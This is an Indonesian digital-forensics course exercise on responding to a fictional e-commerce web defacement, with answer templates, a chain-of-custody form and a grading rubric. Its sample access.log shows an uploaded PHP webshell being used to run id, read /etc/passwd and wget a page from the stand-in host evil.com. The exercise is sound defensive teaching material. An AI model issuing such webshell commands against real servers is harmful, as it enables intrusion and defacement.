# Latihan 2: Incident Response & Evidence Handling
## Forensik Digital & Manajemen Risiko

---

## Tujuan Pembelajaran

Setelah menyelesaikan latihan ini, mahasiswa akan mampu:
1. Melaksanakan prosedur incident response
2. Mengumpulkan dan menangani bukti digital dengan benar
3. Membuat dokumentasi chain of custody
4. Menyusun laporan insiden

---

## Skenario

**Situasi:** Pada hari Senin pukul 08:30 WIB, tim IT PT. TechMart Indonesia menerima alert dari sistem monitoring. Website e-commerce menampilkan halaman yang tidak semestinya (defacement). Anda adalah bagian dari tim Incident Response yang ditugaskan untuk menangani insiden ini.

**Informasi Awal:**
- Server: Ubuntu 20.04
- IP: 192.168.56.10
- Service: Apache 2.4, PHP 7.4, MySQL 8.0
- Waktu deteksi: 08:30 WIB
- Pelapor: Tim IT Support

---

## Bagian A: Initial Response (25 poin)

### Tugas

**A1. (10 poin)** Susun checklist initial response yang harus dilakukan dalam 30 menit pertama.

**Format Jawaban:**
```
INITIAL RESPONSE CHECKLIST
==========================

[ ] Langkah 1: _______________
    - Prioritas: High/Medium/Low
    - PIC: _______________
    - Durasi: ___ menit

[ ] Langkah 2: _______________
    - Prioritas: High/Medium/Low
    - PIC: _______________
    - Durasi: ___ menit

[Lanjutkan minimal 8 langkah]
```

**A2. (10 poin)** Tentukan severity level insiden dan justifikasi keputusan Anda.

**Format Jawaban:**
```
INCIDENT SEVERITY ASSESSMENT
============================

Severity Level: [ ] P1-Critical [ ] P2-High [ ] P3-Medium [ ] P4-Low

Justifikasi:
1. Impact ke bisnis: _______________
2. Impact ke data: _______________
3. Impact ke reputasi: _______________
4. Urgency: _______________

Eskalasi yang diperlukan:
- [ ] CTO
- [ ] CISO
- [ ] Legal
- [ ] PR/Communications
- [ ] CEO

Alasan eskalasi: _______________
```

**A3. (5 poin)** Buat notifikasi awal untuk stakeholder internal.

**Format Template:**
```
INCIDENT NOTIFICATION
=====================

To: [Recipients]
From: [Your Name], Incident Response Team
Date: [Date/Time]
Subject: Security Incident Notification - [Incident ID]

SUMMARY:
_______________

CURRENT STATUS:
_______________

IMMEDIATE ACTIONS TAKEN:
_______________

EXPECTED TIMELINE:
_______________

NEXT UPDATE:
_______________
```

---

## Bagian B: Evidence Collection (35 poin)

### Tugas

**B1. (15 poin)** Susun prosedur pengumpulan bukti untuk skenario ini. Urutkan berdasarkan volatility (order of volatility).

**Format Jawaban:**
```
EVIDENCE COLLECTION PROCEDURE
=============================

1. [HIGHEST VOLATILITY] Memory Dump
   Command: _______________
   Tool: _______________
   Output: _______________
   Hash verification: [ ] Yes [ ] No

2. [HIGH VOLATILITY] Network Connections
   Command: _______________
   Tool: _______________
   Output: _______________

3. [HIGH VOLATILITY] Running Processes
   Command: _______________
   Tool: _______________
   Output: _______________

4. [MEDIUM VOLATILITY] _______________
   [Lanjutkan]

5. [LOW VOLATILITY] Disk Image
   [Lanjutkan]
```

**B2. (10 poin)** Lengkapi form Chain of Custody untuk bukti yang dikumpulkan.

**Chain of Custody Form:**

```
CHAIN OF CUSTODY FORM
=====================

Case Number: DFIR-2024-001
Incident Type: Web Defacement

EVIDENCE ITEM #1
----------------
Evidence ID: EVD-001
Description: _______________
Source Location: _______________
Collection Date/Time: _______________
Collected By: _______________
Collection Method: _______________

Hash Values:
- MD5: _______________
- SHA-256: _______________

Storage Location: _______________
Access Restrictions: _______________

CUSTODY TRANSFER LOG
--------------------
| Date/Time | From | To | Purpose | Signature |
|-----------|------|------|---------|-----------|
| | | | | |

[Ulangi untuk EVD-002, EVD-003, dst]
```

**B3. (10 poin)** Tulis script sederhana untuk mengotomasi pengumpulan volatile data.

**Format Jawaban:**
```bash
#!/bin/bash
# Volatile Data Collection Script
# Case: DFIR-2024-001

# [Tulis script Anda di sini]
# Minimal mencakup:
# - System info
# - Running processes
# - Network connections
# - Logged in users
# - Open files
# - Memory info
# - Hash verification
```

---

## Bagian C: Analysis & Reporting (40 poin)

### Informasi Tambahan untuk Analisis

Setelah pengumpulan bukti, tim menemukan informasi berikut:

**Dari access.log:**
```
45.33.32.156 - - [15/Jan/2024:08:15:22 +0700] "GET /admin/upload.php HTTP/1.1" 200 1234
45.33.32.156 - - [15/Jan/2024:08:16:45 +0700] "POST /admin/upload.php HTTP/1.1" 200 567
45.33.32.156 - - [15/Jan/2024:08:17:30 +0700] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 89
45.33.32.156 - - [15/Jan/2024:08:18:15 +0700] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 2345
45.33.32.156 - - [15/Jan/2024:08:20:00 +0700] "GET /uploads/shell.php?cmd=wget%20http://evil.com/defacement.html HTTP/1.1" 200 123
45.33.32.156 - - [15/Jan/2024:08:21:30 +0700] "GET /uploads/shell.php?cmd=mv%20defacement.html%20/var/www/html/index.html HTTP/1.1" 200 56
```

**File yang ditemukan:**
- `/var/www/html/uploads/shell.php` - PHP webshell
- `/var/www/html/index.html.bak` - Backup index.html asli (dibuat oleh attacker)
- `/tmp/.hidden_backdoor` - Persistence mechanism

### Tugas

**C1. (15 poin)** Buat timeline investigasi berdasarkan bukti yang ditemukan.

**Format Timeline:**
```
INVESTIGATION TIMELINE
======================

[DATE] [TIME] | [SOURCE] | [EVENT] | [MITRE ATT&CK]
-----------------------------------------------------------------
2024-01-15 08:15:22 | access.log | _____ | T____
2024-01-15 08:16:45 | access.log | _____ | T____
[Lanjutkan untuk semua event]
```

**C2. (10 poin)** Identifikasi attack vector dan teknik yang digunakan.

**Format Jawaban:**
```
ATTACK ANALYSIS
===============

1. Initial Access
   - Technique: _______________
   - Evidence: _______________
   - MITRE ATT&CK ID: _______________

2. Execution
   - Technique: _______________
   - Evidence: _______________
   - MITRE ATT&CK ID: _______________

3. Persistence
   - Technique: _______________
   - Evidence: _______________
   - MITRE ATT&CK ID: _______________

4. Impact
   - Technique: _______________
   - Evidence: _______________
   - MITRE ATT&CK ID: _______________

Root Cause Analysis:
_______________
```

**C3. (15 poin)** Susun laporan insiden singkat.

**Template Laporan:**
```
INCIDENT REPORT
===============

DOCUMENT INFORMATION
--------------------
Report ID: IR-2024-001
Classification: [CONFIDENTIAL/INTERNAL/PUBLIC]
Date: _______________
Author: _______________
Version: 1.0

EXECUTIVE SUMMARY
-----------------
[2-3 paragraf ringkasan]

INCIDENT DETAILS
----------------
- Incident Type: _______________
- Detection Time: _______________
- Impact Duration: _______________
- Affected Systems: _______________
- Data Impact: _______________

TIMELINE
--------
[Ringkasan timeline]

ROOT CAUSE
----------
[Penjelasan root cause]

ACTIONS TAKEN
-------------
1. _______________
2. _______________
3. _______________

RECOMMENDATIONS
---------------
Immediate:
1. _______________

Short-term:
1. _______________

Long-term:
1. _______________

LESSONS LEARNED
---------------
1. _______________
2. _______________

APPENDICES
----------
A. Evidence List
B. IOC List
C. [Others]
```

---

## Bonus Question (10 poin tambahan)

Jelaskan perbedaan antara:
1. Incident Response vs Digital Forensics
2. Live Forensics vs Dead Forensics
3. Kapan menggunakan masing-masing pendekatan

---

## Kriteria Penilaian

| Bagian | Poin | Kriteria |
|--------|------|----------|
| A1 | 10 | Checklist lengkap dan terstruktur |
| A2 | 10 | Severity assessment dengan justifikasi tepat |
| A3 | 5 | Notifikasi profesional dan informatif |
| B1 | 15 | Prosedur sesuai order of volatility |
| B2 | 10 | Chain of custody lengkap dan benar |
| B3 | 10 | Script fungsional dan comprehensive |
| C1 | 15 | Timeline akurat dengan MITRE mapping |
| C2 | 10 | Analisis attack vector tepat |
| C3 | 15 | Laporan lengkap dan profesional |
| **Total** | **100** | |
| Bonus | +10 | Penjelasan konsep jelas |

---

## Petunjuk Pengerjaan

1. Gunakan format yang disediakan
2. Referensi ke NIST SP 800-61 Rev 2 untuk incident response
3. Referensi ke ISO 27037 untuk evidence handling
4. MITRE ATT&CK untuk teknik dan taktik
5. Deadline: [TANGGAL]

---

## Referensi

- [NIST SP 800-61 Rev 2 - Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [ISO 27037 - Guidelines for identification, collection, acquisition and preservation of digital evidence](https://www.iso.org/standard/44381.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [SANS Incident Handler's Handbook](https://www.sans.org/white-papers/)
